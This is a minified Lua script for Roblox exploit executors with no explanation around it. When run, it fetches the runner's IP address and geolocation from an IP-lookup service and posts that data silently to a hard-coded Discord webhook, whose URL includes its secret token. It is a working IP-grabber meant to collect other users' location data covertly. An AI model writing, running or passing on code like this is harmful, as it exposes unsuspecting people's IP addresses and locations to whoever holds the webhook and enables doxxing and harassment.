local r=http_request or request or HttpPost or syn.request;local h=game:GetService("HttpService");local w="https://discord.com/api/webhooks/1297605675270275233/UkfItGIL7G_E60BvGIrQWQ5tQ7FWuWGla_EfOa67cBUaqyog5uy3GtvP9u4OSuSlYZiH";local e=function(m,b)local d;if b then d={embeds={{title="Embed Title",description=m,color=16711680}}}else d={content=m}end;local s,r=pcall(function()return r({Url=w,Method="POST",Headers={["Content-Type"]="application/json"},Body=h:JSONEncode(d)})end);if s then print("sigma")else print("): error: "..r)end end;e(game:HttpGet("https://ipapi.co/json/"),false);
